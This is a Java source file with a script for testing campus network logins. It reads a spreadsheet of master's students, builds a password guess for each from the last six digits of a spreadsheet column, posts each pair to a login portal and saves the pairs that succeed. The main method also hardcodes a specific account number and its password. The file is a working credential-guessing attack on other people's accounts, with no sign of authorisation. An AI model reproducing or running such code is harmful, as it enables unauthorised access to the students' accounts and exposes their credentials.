package df;

import org.apache.http.client.fluent.Form;
import org.apache.http.client.fluent.Request;
import org.apache.poi.ss.usermodel.*;
import org.junit.Test;

import java.io.BufferedWriter;
import java.io.IOException;
import java.io.InputStream;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.nio.file.StandardOpenOption;

/**
 * Created by CS on 2017/12/23.
 */

/**
 * 校园网账号测试
 */
public class Hc {
    public static void main(String[] args) throws IOException {
        //http://172.16.200.11/DDDDD:2016111028
//        upass:4034787
//        0MKKey:123
//        System.out.println(Request.Get("http://www.baidu.com").execute().returnContent());
//        testHC();
        System.out.println(testHC("2016111028", "4034787"));
    }


    public static boolean testHC(String name, String pwd) throws IOException {
        String content = Request.Post("http://172.16.200.11/").bodyForm(Form.form().
                add("DDDDD", name).
                add("upass", pwd).
                add("0MKKey", "123").build()).
                execute().returnContent().asString();
//        System.out.println(content);
        if (content.contains("您已经成功登录")) return true;
        return false;
    }

    @Test
    public void testPOI() {
        try (InputStream in = Files.newInputStream(Paths.get("C:\\Users\\CS\\Desktop\\2013级硕士名单.xls"));BufferedWriter writer = Files.newBufferedWriter(Paths.get("res.txt"), StandardOpenOption.CREATE_NEW)) {
            Workbook sheets = WorkbookFactory.create(in);
            for (Sheet sheet : sheets) {
                for (Row row : sheet) {
                    String name = "";
                    String pwd = "";
                    Cell cell = row.getCell(1);
                    if (cell != null) {
                        name = cell.toString().trim();
                    }

                    Cell cell1 = row.getCell(11);
                    if (cell1 != null) {
                        pwd = cell1.toString().trim();
//                        System.out.println(pwd.length());
                        pwd = pwd.substring(pwd.length()-6, pwd.length());
                    }
//                    System.out.println(name+"\t"+pwd);
                    if (testHC(name, pwd))
                        writer.write(name+"\t"+pwd+"\n");
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
